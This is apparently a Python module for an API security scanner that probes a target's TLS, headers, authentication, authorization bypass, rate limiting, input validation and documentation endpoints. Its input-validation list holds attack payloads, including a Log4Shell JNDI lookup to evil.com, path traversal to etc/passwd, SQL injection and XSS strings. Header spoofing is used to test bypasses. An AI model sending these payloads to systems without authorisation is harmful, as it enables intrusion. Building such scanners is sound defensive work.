import aiohttp
import asyncio
import json
import logging
import time
from datetime import datetime
from typing import Dict, List, Any
from urllib.parse import urljoin, urlparse
import ssl
import re

from schemas import APISecurityAnalyzerInput, APISecurityAnalyzerOutput, SecurityIssue

# Initialize logger
logger = logging.getLogger(__name__)

# Tool metadata
TOOL_INFO = {
    "name": "API Security Analyzer",
    "description": "Comprehensive API security analysis tool that identifies vulnerabilities, misconfigurations, and security best practice violations in REST, GraphQL, and SOAP APIs",
    "category": "api_security",
    "author": "Wildbox Security",
    "version": "1.0.0",
    "input_schema": APISecurityAnalyzerInput,
    "output_schema": APISecurityAnalyzerOutput
}

async def execute_tool(data: APISecurityAnalyzerInput) -> APISecurityAnalyzerOutput:
    """
    Analyze API security configurations and vulnerabilities
    """
    start_time = time.time()
    
    # Initialize results
    security_issues = []
    endpoints_discovered = []
    security_headers = {}
    auth_methods = []
    encryption_status = {}
    rate_limiting_status = {}
    recommendations = []
    
    try:
        # Create session with custom headers
        headers = {
            'User-Agent': 'Wildbox-API-Security-Analyzer/1.0',
            'Accept': 'application/json, text/plain, */*'
        }
        
        if data.custom_headers:
            headers.update(data.custom_headers)
        
        timeout = aiohttp.ClientTimeout(total=data.timeout)
        
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            
            # 1. Basic connectivity and SSL analysis
            ssl_issues = await analyze_ssl_configuration(session, data.target_url)
            security_issues.extend(ssl_issues)
            
            # 2. Security headers analysis
            headers_issues, detected_headers = await analyze_security_headers(session, data.target_url)
            security_issues.extend(headers_issues)
            security_headers = detected_headers
            
            # 3. Authentication analysis
            if data.check_authentication:
                auth_issues, detected_auth = await analyze_authentication(session, data.target_url, data.api_type)
                security_issues.extend(auth_issues)
                auth_methods = detected_auth
            
            # 4. Authorization analysis
            if data.check_authorization:
                authz_issues = await analyze_authorization(session, data.target_url, data.api_type)
                security_issues.extend(authz_issues)
            
            # 5. Rate limiting analysis
            if data.check_rate_limiting:
                rate_issues, rate_status = await analyze_rate_limiting(session, data.target_url)
                security_issues.extend(rate_issues)
                rate_limiting_status = rate_status
            
            # 6. Input validation analysis
            if data.check_input_validation:
                validation_issues = await analyze_input_validation(session, data.target_url, data.api_type)
                security_issues.extend(validation_issues)
            
            # 7. API endpoint discovery
            if data.api_type.upper() == "REST":
                endpoints_discovered = await discover_rest_endpoints(session, data.target_url)
            elif data.api_type.upper() == "GRAPHQL":
                endpoints_discovered = await discover_graphql_schema(session, data.target_url)
            
            # 8. Encryption analysis
            if data.check_encryption:
                encryption_issues, enc_status = await analyze_encryption(session, data.target_url)
                security_issues.extend(encryption_issues)
                encryption_status = enc_status
        
        # Calculate security score and generate recommendations
        security_score = calculate_security_score(security_issues)
        recommendations = generate_recommendations(security_issues)
        
        # Count issues by severity
        severity_counts = {
            'critical': len([i for i in security_issues if i.severity.lower() == 'critical']),
            'high': len([i for i in security_issues if i.severity.lower() == 'high']),
            'medium': len([i for i in security_issues if i.severity.lower() == 'medium']),
            'low': len([i for i in security_issues if i.severity.lower() == 'low']),
            'info': len([i for i in security_issues if i.severity.lower() == 'info'])
        }
        
        execution_time = time.time() - start_time
        
        return APISecurityAnalyzerOutput(
            target_url=data.target_url,
            api_type=data.api_type,
            analysis_timestamp=datetime.now().isoformat(),
            total_issues=len(security_issues),
            critical_issues=severity_counts['critical'],
            high_issues=severity_counts['high'],
            medium_issues=severity_counts['medium'],
            low_issues=severity_counts['low'],
            info_issues=severity_counts['info'],
            security_issues=security_issues,
            api_endpoints_discovered=endpoints_discovered,
            security_headers=security_headers,
            authentication_methods=auth_methods,
            encryption_status=encryption_status,
            rate_limiting_status=rate_limiting_status,
            overall_security_score=security_score,
            recommendations=recommendations,
            execution_time=execution_time
        )
        
    except Exception as e:
        # Return error result
        execution_time = time.time() - start_time
        error_issue = SecurityIssue(
            severity="Critical",
            category="Connection",
            title="Analysis Failed",
            description=f"Failed to analyze API: {str(e)}",
            recommendation="Verify the target URL is accessible and valid",
            affected_endpoint=data.target_url
        )
        
        return APISecurityAnalyzerOutput(
            target_url=data.target_url,
            api_type=data.api_type,
            analysis_timestamp=datetime.now().isoformat(),
            total_issues=1,
            critical_issues=1,
            high_issues=0,
            medium_issues=0,
            low_issues=0,
            info_issues=0,
            security_issues=[error_issue],
            api_endpoints_discovered=[],
            security_headers={},
            authentication_methods=[],
            encryption_status={},
            rate_limiting_status={},
            overall_security_score=0.0,
            recommendations=["Fix connectivity issues and retry analysis"],
            execution_time=execution_time
        )

async def analyze_ssl_configuration(session: aiohttp.ClientSession, url: str) -> List[SecurityIssue]:
    """Analyze SSL/TLS configuration"""
    issues = []
    
    try:
        parsed_url = urlparse(url)
        if parsed_url.scheme == 'http':
            issues.append(SecurityIssue(
                severity="High",
                category="Encryption",
                title="Unencrypted HTTP Connection",
                description="API is using HTTP instead of HTTPS",
                recommendation="Implement HTTPS with proper SSL/TLS configuration",
                cwe_id="CWE-319",
                affected_endpoint=url
            ))
        elif parsed_url.scheme == 'https':
            # Try to get SSL info
            try:
                async with session.get(url) as response:
                    if hasattr(response, 'connection') and hasattr(response.connection, 'transport'):
                        ssl_obj = response.connection.transport.get_extra_info('ssl_object')
                        if ssl_obj:
                            cipher = ssl_obj.cipher()
                            if cipher and len(cipher) >= 3:
                                if cipher[2] < 128:  # Key length
                                    issues.append(SecurityIssue(
                                        severity="Medium",
                                        category="Encryption",
                                        title="Weak SSL Cipher",
                                        description=f"Weak encryption cipher detected: {cipher[0]}",
                                        recommendation="Use strong encryption ciphers (AES-256)",
                                        cwe_id="CWE-326",
                                        affected_endpoint=url
                                    ))
            except (ssl.SSLError, aiohttp.ClientConnectorError) as e:
                logger.warning(f"SSL connection error for {url}: {e}")
            except Exception as e:
                logger.error(f"Unexpected error during SSL analysis for {url}: {e}")
    except (ConnectionError, aiohttp.ClientError) as e:
        logger.warning(f"Network connection error for {url}: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in SSL configuration analysis: {e}")
    
    return issues

async def analyze_security_headers(session: aiohttp.ClientSession, url: str) -> tuple[List[SecurityIssue], Dict[str, str]]:
    """Analyze security headers"""
    issues = []
    detected_headers = {}
    
    try:
        async with session.get(url) as response:
            headers = dict(response.headers)
            
            # Check for security headers
            security_header_checks = {
                'Strict-Transport-Security': {
                    'severity': 'Medium',
                    'title': 'Missing HSTS Header',
                    'description': 'HTTP Strict Transport Security header not found'
                },
                'X-Content-Type-Options': {
                    'severity': 'Low',
                    'title': 'Missing X-Content-Type-Options Header',
                    'description': 'X-Content-Type-Options header not found'
                },
                'X-Frame-Options': {
                    'severity': 'Medium',
                    'title': 'Missing X-Frame-Options Header',
                    'description': 'X-Frame-Options header not found'
                },
                'Content-Security-Policy': {
                    'severity': 'Medium',
                    'title': 'Missing Content Security Policy',
                    'description': 'Content-Security-Policy header not found'
                },
                'X-XSS-Protection': {
                    'severity': 'Low',
                    'title': 'Missing X-XSS-Protection Header',
                    'description': 'X-XSS-Protection header not found'
                }
            }
            
            for header_name, check_info in security_header_checks.items():
                header_value = None
                for h_name, h_value in headers.items():
                    if h_name.lower() == header_name.lower():
                        header_value = h_value
                        detected_headers[header_name] = h_value
                        break
                
                if not header_value:
                    issues.append(SecurityIssue(
                        severity=check_info['severity'],
                        category="Security Headers",
                        title=check_info['title'],
                        description=check_info['description'],
                        recommendation=f"Implement {header_name} header with appropriate values",
                        affected_endpoint=url
                    ))
            
            # Check for information disclosure headers
            disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version']
            for header_name in disclosure_headers:
                for h_name, h_value in headers.items():
                    if h_name.lower() == header_name.lower():
                        detected_headers[header_name] = h_value
                        issues.append(SecurityIssue(
                            severity="Info",
                            category="Information Disclosure",
                            title=f"Information Disclosure via {header_name} Header",
                            description=f"Server reveals technology information: {h_value}",
                            recommendation=f"Remove or obfuscate {header_name} header",
                            affected_endpoint=url
                        ))
                        break
    
    except Exception:
        pass
    
    return issues, detected_headers

async def analyze_authentication(session: aiohttp.ClientSession, url: str, api_type: str) -> tuple[List[SecurityIssue], List[str]]:
    """Analyze authentication mechanisms"""
    issues = []
    auth_methods = []
    
    try:
        # Test for various authentication methods
        async with session.get(url) as response:
            headers = dict(response.headers)
            
            # Check WWW-Authenticate header
            for h_name, h_value in headers.items():
                if h_name.lower() == 'www-authenticate':
                    auth_methods.append(f"HTTP Authentication: {h_value}")
                    if 'basic' in h_value.lower():
                        issues.append(SecurityIssue(
                            severity="High",
                            category="Authentication",
                            title="Basic Authentication Detected",
                            description="HTTP Basic Authentication is insecure",
                            recommendation="Use secure authentication methods like OAuth 2.0 or JWT",
                            cwe_id="CWE-522",
                            affected_endpoint=url
                        ))
            
            # Check for common API key patterns in URL
            if '?api_key=' in url.lower() or '&api_key=' in url.lower():
                auth_methods.append("API Key in URL")
                issues.append(SecurityIssue(
                    severity="High",
                    category="Authentication",
                    title="API Key in URL",
                    description="API key exposed in URL parameters",
                    recommendation="Move API keys to headers or request body",
                    cwe_id="CWE-598",
                    affected_endpoint=url
                ))
        
        # Test authentication bypass attempts
        test_paths = ['/admin', '/api/admin', '/dashboard', '/swagger', '/api-docs']
        for path in test_paths:
            test_url = urljoin(url, path)
            try:
                async with session.get(test_url) as response:
                    if response.status == 200:
                        issues.append(SecurityIssue(
                            severity="High",
                            category="Authentication",
                            title="Unauthenticated Access to Sensitive Endpoint",
                            description=f"Sensitive endpoint accessible without authentication: {path}",
                            recommendation="Implement proper authentication for all sensitive endpoints",
                            cwe_id="CWE-306",
                            affected_endpoint=test_url
                        ))
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.warning(f"Network error testing authentication for {test_url}: {e}")
            except Exception as e:
                logger.error(f"Unexpected error during authentication test for {test_url}: {e}")
    
    except (ConnectionError, aiohttp.ClientError) as e:
        logger.warning(f"Network error during authentication analysis for {url}: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in authentication analysis: {e}")
    
    return issues, auth_methods

async def analyze_authorization(session: aiohttp.ClientSession, url: str, api_type: str) -> List[SecurityIssue]:
    """Analyze authorization controls"""
    issues = []
    
    try:
        # Test for common authorization bypasses
        bypass_tests = [
            {'header': 'X-Original-URL', 'value': '/admin'},
            {'header': 'X-Rewrite-URL', 'value': '/admin'},
            {'header': 'X-Forwarded-For', 'value': '127.0.0.1'},
            {'header': 'X-Remote-IP', 'value': '127.0.0.1'},
        ]
        
        for test in bypass_tests:
            headers = {test['header']: test['value']}
            try:
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        issues.append(SecurityIssue(
                            severity="High",
                            category="Authorization",
                            title=f"Authorization Bypass via {test['header']} Header",
                            description=f"Authorization can be bypassed using {test['header']} header",
                            recommendation="Implement proper authorization checks that cannot be bypassed",
                            cwe_id="CWE-285",
                            affected_endpoint=url
                        ))
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.warning(f"Network error testing authorization bypass for {url}: {e}")
            except Exception as e:
                logger.error(f"Unexpected error during authorization bypass test: {e}")
    
    except (ConnectionError, aiohttp.ClientError) as e:
        logger.warning(f"Network error during authorization analysis for {url}: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in authorization analysis: {e}")
    
    return issues

async def analyze_rate_limiting(session: aiohttp.ClientSession, url: str) -> tuple[List[SecurityIssue], Dict[str, Any]]:
    """Analyze rate limiting implementation"""
    issues = []
    rate_status = {'implemented': False, 'headers': {}}
    
    try:
        # Send multiple rapid requests
        tasks = []
        for i in range(10):
            tasks.append(session.get(url))
        
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        
        rate_limit_headers = ['X-RateLimit-Limit', 'X-Rate-Limit-Limit', 'RateLimit-Limit']
        rate_remaining_headers = ['X-RateLimit-Remaining', 'X-Rate-Limit-Remaining', 'RateLimit-Remaining']
        
        for response in responses:
            if isinstance(response, aiohttp.ClientResponse):
                headers = dict(response.headers)
                
                # Check for rate limiting headers
                for header_name in rate_limit_headers + rate_remaining_headers:
                    for h_name, h_value in headers.items():
                        if h_name.lower() == header_name.lower():
                            rate_status['implemented'] = True
                            rate_status['headers'][header_name] = h_value
                
                # Check for 429 status code
                if response.status == 429:
                    rate_status['implemented'] = True
                    break
        
        if not rate_status['implemented']:
            issues.append(SecurityIssue(
                severity="Medium",
                category="Rate Limiting",
                title="No Rate Limiting Detected",
                description="API does not implement rate limiting",
                recommendation="Implement rate limiting to prevent abuse and DoS attacks",
                cwe_id="CWE-770",
                affected_endpoint=url
            ))
    
    except Exception:
        pass
    
    return issues, rate_status

async def analyze_input_validation(session: aiohttp.ClientSession, url: str, api_type: str) -> List[SecurityIssue]:
    """Analyze input validation"""
    issues = []
    
    try:
        # Test common injection payloads
        injection_tests = [
            "' OR '1'='1",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for payload in injection_tests:
            try:
                # Test as query parameter
                test_url = f"{url}?test={payload}"
                async with session.get(test_url) as response:
                    response_text = await response.text()
                    
                    if payload in response_text:
                        injection_type = "XSS" if "<script>" in payload else "Injection"
                        issues.append(SecurityIssue(
                            severity="High",
                            category="Input Validation",
                            title=f"Potential {injection_type} Vulnerability",
                            description=f"Input validation bypass detected with payload: {payload}",
                            recommendation="Implement proper input validation and output encoding",
                            cwe_id="CWE-79" if injection_type == "XSS" else "CWE-89",
                            affected_endpoint=test_url
                        ))
                
                # Test as POST data if applicable
                if api_type.upper() in ["REST", "SOAP"]:
                    data = {"test": payload}
                    async with session.post(url, json=data) as response:
                        if response.status != 405:  # Method not allowed
                            response_text = await response.text()
                            if payload in response_text:
                                injection_type = "XSS" if "<script>" in payload else "Injection"
                                issues.append(SecurityIssue(
                                    severity="High",
                                    category="Input Validation",
                                    title=f"Potential {injection_type} Vulnerability (POST)",
                                    description=f"Input validation bypass detected in POST data: {payload}",
                                    recommendation="Implement proper input validation and output encoding",
                                    cwe_id="CWE-79" if injection_type == "XSS" else "CWE-89",
                                    affected_endpoint=url
                                ))
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.warning(f"Network error testing input validation for {url}: {e}")
            except (json.JSONDecodeError, UnicodeDecodeError) as e:
                logger.warning(f"Data encoding error during input validation test: {e}")
            except Exception as e:
                logger.error(f"Unexpected error during input validation test: {e}")
    
    except (ConnectionError, aiohttp.ClientError) as e:
        logger.warning(f"Network error during input validation analysis for {url}: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in input validation analysis: {e}")
    
    return issues

async def discover_rest_endpoints(session: aiohttp.ClientSession, url: str) -> List[str]:
    """Discover REST API endpoints"""
    endpoints = []
    
    try:
        # Common API documentation endpoints
        doc_paths = [
            '/swagger.json',
            '/api-docs',
            '/swagger-ui',
            '/openapi.json',
            '/docs',
            '/api/docs',
            '/v1/docs',
            '/redoc'
        ]
        
        for path in doc_paths:
            test_url = urljoin(url, path)
            try:
                async with session.get(test_url) as response:
                    if response.status == 200:
                        endpoints.append(test_url)
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"Network error testing endpoint {test_url}: {e}")
            except Exception as e:
                logger.error(f"Unexpected error testing endpoint {test_url}: {e}")
        
        # Common REST endpoints
        common_paths = [
            '/api/users',
            '/api/v1/users',
            '/api/admin',
            '/api/health',
            '/api/status',
            '/health',
            '/status',
            '/metrics'
        ]
        
        for path in common_paths:
            test_url = urljoin(url, path)
            try:
                async with session.get(test_url) as response:
                    if response.status in [200, 401, 403]:  # Include auth-protected endpoints
                        endpoints.append(test_url)
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                logger.debug(f"Network error testing common endpoint {test_url}: {e}")
            except Exception as e:
                logger.error(f"Unexpected error testing common endpoint {test_url}: {e}")
    
    except (ConnectionError, aiohttp.ClientError) as e:
        logger.warning(f"Network error during REST endpoint discovery for {url}: {e}")
    except Exception as e:
        logger.error(f"Unexpected error in REST endpoint discovery: {e}")
    
    return endpoints

async def discover_graphql_schema(session: aiohttp.ClientSession, url: str) -> List[str]:
    """Discover GraphQL schema information"""
    endpoints = []
    
    try:
        # GraphQL introspection query
        introspection_query = {
            "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } } }"
        }
        
        async with session.post(url, json=introspection_query) as response:
            if response.status == 200:
                data = await response.json()
                if 'data' in data and '__schema' in data['data']:
                    endpoints.append(f"{url} (GraphQL Schema Available)")
                    
                    schema = data['data']['__schema']
                    if schema.get('queryType'):
                        endpoints.append(f"Query Type: {schema['queryType']['name']}")
                    if schema.get('mutationType'):
                        endpoints.append(f"Mutation Type: {schema['mutationType']['name']}")
                    if schema.get('subscriptionType'):
                        endpoints.append(f"Subscription Type: {schema['subscriptionType']['name']}")
    
    except Exception:
        pass
    
    return endpoints

async def analyze_encryption(session: aiohttp.ClientSession, url: str) -> tuple[List[SecurityIssue], Dict[str, Any]]:
    """Analyze encryption configuration"""
    issues = []
    encryption_status = {}
    
    try:
        parsed_url = urlparse(url)
        encryption_status['uses_https'] = parsed_url.scheme == 'https'
        
        if not encryption_status['uses_https']:
            issues.append(SecurityIssue(
                severity="Critical",
                category="Encryption",
                title="No HTTPS Encryption",
                description="API is not using HTTPS encryption",
                recommendation="Implement HTTPS with proper SSL/TLS configuration",
                cwe_id="CWE-319",
                affected_endpoint=url
            ))
        
        # Check for mixed content
        async with session.get(url) as response:
            if response.status == 200:
                content = await response.text()
                if 'http://' in content and parsed_url.scheme == 'https':
                    issues.append(SecurityIssue(
                        severity="Medium",
                        category="Encryption",
                        title="Mixed Content Detected",
                        description="HTTPS page contains HTTP resources",
                        recommendation="Use HTTPS for all resources",
                        cwe_id="CWE-319",
                        affected_endpoint=url
                    ))
    
    except Exception:
        pass
    
    return issues, encryption_status

def calculate_security_score(issues: List[SecurityIssue]) -> float:
    """Calculate overall security score"""
    if not issues:
        return 100.0
    
    # Weight by severity
    severity_weights = {
        'critical': 25,
        'high': 15,
        'medium': 10,
        'low': 5,
        'info': 1
    }
    
    total_deduction = 0
    for issue in issues:
        weight = severity_weights.get(issue.severity.lower(), 5)
        total_deduction += weight
    
    # Cap at 0 and scale to 100
    score = max(0, 100 - total_deduction)
    return round(score, 2)

def generate_recommendations(issues: List[SecurityIssue]) -> List[str]:
    """Generate prioritized recommendations"""
    recommendations = []
    
    # Group by category and severity
    critical_issues = [i for i in issues if i.severity.lower() == 'critical']
    high_issues = [i for i in issues if i.severity.lower() == 'high']
    
    if critical_issues:
        recommendations.append("Immediately address all critical security issues")
    
    if high_issues:
        recommendations.append("Prioritize fixing high-severity vulnerabilities")
    
    # Category-specific recommendations
    categories = set(issue.category for issue in issues)
    
    if "Encryption" in categories:
        recommendations.append("Implement HTTPS and strong encryption")
    
    if "Authentication" in categories:
        recommendations.append("Strengthen authentication mechanisms")
    
    if "Security Headers" in categories:
        recommendations.append("Implement security headers")
    
    if "Rate Limiting" in categories:
        recommendations.append("Implement rate limiting and DDoS protection")
    
    if "Input Validation" in categories:
        recommendations.append("Implement comprehensive input validation")
    
    recommendations.append("Regular security testing and monitoring")
    recommendations.append("Follow OWASP API Security Top 10 guidelines")
    
    return recommendations
